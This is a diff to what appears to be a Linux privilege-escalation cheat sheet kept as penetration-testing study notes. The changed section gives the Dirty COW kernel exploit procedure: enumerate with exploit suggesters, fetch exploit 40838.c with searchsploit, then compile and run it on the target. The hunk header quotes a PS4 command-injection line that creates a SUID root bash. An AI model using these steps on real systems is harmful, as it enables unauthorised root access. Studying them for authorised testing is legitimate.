@@ -252,15 +252,15 @@ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootba
 ## Kernel Exploits ✅
 ### Example "Dirty COW" ✡️
 ```bash
-bash linux-exploit-suggester.sh
-perl linux-exploit-suggester-2.pl
+bash linux-exploit-suggester.sh # target machine
+perl linux-exploit-suggester-2.pl # target machine
 
-searchsploit --cve CVE-2016-5195
-searchsploit -m linux/local/40616.c
-# We transfer the file to the target system
+searchsploit --cve CVE-2016-5195 # our kali
+searchsploit -m linux/local/40838.c # our kali
+# We transfer "40838.c" file to the target system
 
-gcc /tmp/40616.c -pthread -o /tmp/exploit
-./exploit
+gcc /tmp/40838.c -pthread -o /tmp/exploit # target machine
+./exploit # target machine
 ```
 ## NFS ✅
 ```bash
